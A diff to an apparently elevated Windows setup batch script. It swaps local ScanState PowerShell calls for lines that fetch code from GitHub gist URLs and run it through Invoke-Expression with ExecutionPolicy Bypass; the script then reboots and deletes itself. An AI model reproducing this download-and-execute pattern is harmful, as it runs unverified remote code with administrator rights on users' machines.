@@ -18,17 +18,20 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :-----------------------------------------------------------------------
+@echo off
+cls
 devmgmt.msc
 attrib C:\Recovery +h +s
 IF %PROCESSOR_ARCHITECTURE% == x86 (IF NOT DEFINED PROCESSOR_ARCHITEW6432 goto bit32)
 goto bit64
 :bit32
-powershell.exe -ExecutionPolicy Bypass -File "%~dp0\ScanStatex86.ps1" -Verb RunAs
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/761b1ced386f1da3c756f0563a44828a/raw | Invoke-Expression"
 goto cont
 :bit64
-powershell.exe -ExecutionPolicy Bypass -File "%~dp0\ScanStatex64.ps1" -Verb RunAs
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/2a53fc1c315eb048bcd944852fafab81/raw | Invoke-Expression"
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/d1aa33bf1b204b842359887301ae5b9c/raw | Invoke-Expression"
 :cont
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/cbe0cbdbfeaedcb9ba48efd200182a0b/raw | Invoke-Expression"
 pause
-if exist %SystemDrive%\Recovery\OEM\Apps\pbr.ps1 powershell -ExecutionPolicy bypass -File %SystemDrive%\Recovery\OEM\Apps\pbr.ps1 -Verb RunAs
 shutdown /r
 (goto) 2>nul & del "%~f0"
